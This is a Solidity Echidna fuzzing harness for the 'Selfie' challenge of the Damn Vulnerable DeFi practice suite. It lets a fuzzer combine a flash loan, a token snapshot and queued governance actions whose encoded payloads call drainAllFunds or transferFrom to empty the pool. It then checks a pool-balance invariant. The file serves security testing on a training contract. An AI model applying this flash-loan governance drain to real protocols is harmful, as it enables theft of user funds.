// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @notice to run echidna use following command:
 * npx hardhat clean && npx hardhat compile --force && echidna-test . --contract EchidnaSelfie --config ./selfie.yaml
 */

// the SelfieDeployment contract is used to set fuzzing environment (to deploy all necessary contracts)
contract SelfieDeployment {
    uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether;
    uint256 TOKENS_IN_POOL = 1_500_000 ether;

    function deployContracts()
        external
        returns (SelfiePool, SimpleGovernance, DamnValuableTokenSnapshot)
    {
        // deploy contracts
        DamnValuableTokenSnapshot token;
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);

        SimpleGovernance governance;
        governance = new SimpleGovernance(address(token));

        SelfiePool pool;
        pool = new SelfiePool(address(token), address(governance));
        // fund selfie pool
        token.transfer(address(pool), TOKENS_IN_POOL);
        // return all necessary contracts
        return (pool, governance, token);
    }
}

contract EchidnaSelfie {
    uint256 private ACTION_DELAY_IN_SECONDS = 2 days;
    uint256 private TOKENS_IN_POOL = 1_500_000 ether;

    uint256 private actionId; // to track id of queued actions
    uint256[] private actionsToBeCalled; // actions to be called in callback function

    // all possible actions for callback
    enum CallbackActions {
        drainAllFunds,
        transferFrom,
        queueAction,
        executeAction
    }
    uint256 private callbackActionsLength = 4; // must correspond with the length of Actions

    // queueAction payloads to be created by Echidna
    enum PayloadsForQueueAction {
        noPayloadSet, // only for logging purposes
        drainAllFunds,
        transferFrom
    }
    uint256 private payloadsLength = 2; // must correspond with the length of Payloads
    uint256 private _payloadSetTo; // to know which payload has been set (logging purposes)
    // queueAction parameters:
    bytes private _payload; // current payload for queueAction
    uint256 private _weiAmountForQueueAction; // the second queueAction parameters

    uint256 private _amountForTransferFromInCallback; // transfer function parameter

    SelfiePool pool;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot token;

    event ActionCalledInCallback(string action); // to track which actions has been called in callback
    event AssertionFailed(string reason);
    event PayloadInQueueActionSetTo(string payload);
    event PayloadVariable(string name, uint256 variable);

    constructor() payable {
        SelfieDeployment deployer;
        deployer = new SelfieDeployment();
        (pool, governance, token) = deployer.deployContracts();
    }

    /**
     * @notice to call a flash loan
     */
    function flashLoan() public {
        // borrow max amount of tokens
        uint256 borrowAmount = token.balanceOf(address(pool)); // TODO: parametrize?
        pool.flashLoan(borrowAmount);
    }

    /**
     * @notice a callback to be called by pool once flashloan is taken
     * @param _amount amount of tokens to borrow
     */
    function receiveTokens(address, uint256 _amount) external {
        require(
            msg.sender == address(pool),
            "Only SelfiePool can call this function."
        );
        // logic
        callbackActions();
        // repay the loan
        require(token.transfer(address(pool), _amount), "Flash loan failed");
    }

    /**
     * @notice actions to be called once receiveTokens() of this contract is called
     */
    function callbackActions() internal {
        uint256 genArrLength = actionsToBeCalled.length;
        if (genArrLength != 0) {
            for (uint256 i; i < genArrLength; i++) {
                callAction(actionsToBeCalled[i]);
            }
        } else {
            revert("actionsToBeCalled is empty, no action called");
        }
    }

    /**
     * @notice an action to be called
     * @param _num a number representing the action to be called
     */
    function callAction(uint256 _num) internal {
        // drain all funds
        if (_num == uint256(CallbackActions.drainAllFunds)) {
            drainAllFunds();
        }
        // transfer funds
        if (_num == uint256(CallbackActions.transferFrom)) {
            callbackTransferFrom();
        }
        // queue an action
        if (_num == uint256(CallbackActions.queueAction)) {
            try this.queueAction() {} catch {
                revert("queueAction unsuccessful");
            }
        }
        // execute an action
        if (_num == uint256(CallbackActions.executeAction)) {
            try this.executeAction() {} catch {
                revert("queueAction unsuccessful");
            }
        }
    }

    //////////////////////
    // CALLBACK ACTIONS //
    //////////////////////

    // 1: drainAllFunds()
    function drainAllFunds() public {
        pool.drainAllFunds(address(this));
    }

    function pushDrainAllFundsToCallback() external {
        actionsToBeCalled.push(uint256(CallbackActions.drainAllFunds));
    }

    ///////////////////////
    // 2: transferFrom() //
    function transferFrom(uint256 _amount) external {
        require(_amount > 0, "Cannot transfer zero tokens");
        token.transferFrom(address(pool), address(this), _amount);
    }

    // @note callable only in a callback
    function callbackTransferFrom() internal {
        token.transferFrom(
            address(pool),
            address(this),
            _amountForTransferFromInCallback
        );
    }

    function pushTransferFromToCallback(uint256 _amount) external {
        require(_amount > 0, "Cannot transfer zero tokens");
        _amountForTransferFromInCallback = _amount;
        actionsToBeCalled.push(uint256(CallbackActions.transferFrom));
    }

    //////////////////////
    // 3: queueAction() //
    function queueAction() public {
        require(
            address(this).balance >= _weiAmountForQueueAction,
            "Not sufficient account balance to queue an action"
        );
        // take a snaphost first as it is needed in queueAction()
        token.snapshot();
        // queue the action;
        actionId = governance.queueAction(
            address(pool),
            _payload,
            _weiAmountForQueueAction
        );
    }

    function pushQueueActionToCallback(
        uint256 _weiAmount,
        uint256 _payloadNum,
        uint256 _amountToTransfer
    ) external {
        require(
            address(this).balance >= _weiAmount,
            "Not sufficient account balance to queue an action"
        );
        if (_payloadNum == uint256(PayloadsForQueueAction.transferFrom)) {
            require(_amountToTransfer > 0, "Cannot transfer 0 tokens");
        }
        // Add the action into callback array
        actionsToBeCalled.push(uint256(CallbackActions.queueAction));
        // Define parameters
        // 1: set WEI for queue action
        _weiAmountForQueueAction = _weiAmount;
        // 2: create payload
        setPayload(_payloadNum, _amountToTransfer);
    }

    /**
     * @notice create payload for queue action
     * @param _payloadNum a number to decide which payload to be created
     */
    function setPayload(
        uint256 _payloadNum,
        uint256 _amountToTransfer
    ) internal {
        // optimization: to create only valid payloads, narrow down the _payloadNum
        _payloadNum = _payloadNum % payloadsLength;
        // update the state to know which payload was used in queueAction() (logging purposes, see emitPayloadCreated())
        _payloadSetTo = _payloadNum;
        // create payload of drainAllFunds
        if (_payloadNum == uint256(PayloadsForQueueAction.drainAllFunds)) {
            _payload = abi.encodeWithSignature(
                "drainAllFunds(address)",
                address(this)
            );
        }
        // create payload of transfer
        if (_payloadNum == uint256(PayloadsForQueueAction.transferFrom)) {
            _payload = abi.encodeWithSignature(
                "transferFrom(address,address,uint256)",
                address(pool),
                address(this),
                _amountToTransfer
            );
        }
    }

    ////////////////////////
    // 4: executeAction() //
    function executeAction() public {
        // get data related to the action to be executed
        (, , uint256 weiAmount, uint256 proposedAt, ) = governance.actions(
            actionId
        );
        require(
            address(this).balance >= weiAmount,
            "Not sufficient account balance to execute the action"
        );
        require(
            block.timestamp >= proposedAt + ACTION_DELAY_IN_SECONDS,
            "Time for action execution has not passed yet"
        );
        // Action
        governance.executeAction{value: weiAmount}(actionId);
    }

    function pushExecuteActionToCallback() external {
        actionsToBeCalled.push(uint256(CallbackActions.executeAction));
    }

    /////////////
    // HELPERS //
    /////////////

    /**
     * @notice check if a balance of DVT in pool has changed;
     */
    function _checkPoolBalance() external view returns (bool) {
        if (token.balanceOf(address(pool)) == TOKENS_IN_POOL) {
            return true;
        } else {
            revert("Invariant broken");
        }
    }

    /**
     * @notice emit event of an action executed in callback, i.e. once receiveTokens() is called
     * @param _actionNumber a number of action executed
     */
    function emitActionExecuted(uint256 _actionNumber) internal {
        if (_actionNumber == uint256(CallbackActions.queueAction)) {
            emit ActionCalledInCallback("queueAction()");
        }
        if (_actionNumber == uint256(CallbackActions.executeAction)) {
            emit ActionCalledInCallback("executeAction()");
        }
        if (_actionNumber == uint256(CallbackActions.drainAllFunds)) {
            emit ActionCalledInCallback("drainAllFunds()");
        }
        if (_actionNumber == uint256(CallbackActions.transferFrom)) {
            emit ActionCalledInCallback("transferFrom()");
        }
    }

    /**
     * @notice emit event of a payload created in queueAction()
     */
    function emitPayloadCreated() internal {
        if (_payloadSetTo == uint256(PayloadsForQueueAction.drainAllFunds)) {
            emit PayloadInQueueActionSetTo("drainAllFunds(address)");
        }
        if (_payloadSetTo == uint256(PayloadsForQueueAction.transferFrom)) {
            emit PayloadInQueueActionSetTo(
                "transferFrom(address,address,uint256)"
            );
            emit PayloadVariable(
                "_amountToTransfer",
                _amountForTransferFromInCallback
            );
        }
    }

    ////////////////
    // INVARIANTS //
    ////////////////

    // GENERAL: Can we drain SelfiePool?

    function checkPoolBalance() external {
        try this._checkPoolBalance() {
            // pool balance has not changed
        } catch {
            // log if payload has been set
            if (_payloadSetTo != uint256(PayloadsForQueueAction.noPayloadSet)) {
                emit PayloadVariable(
                    "_weiAmountForQueueAction: ",
                    _weiAmountForQueueAction
                );
                emitPayloadCreated();
            }
            // log actions called
            uint256 actionsArrLength = actionsToBeCalled.length;
            for (uint256 i; i < actionsArrLength; i++) {
                emitActionExecuted(actionsToBeCalled[i]);
            }
            // emit assertion violation
            emit AssertionFailed("Invariant broken");
        }
    }
}
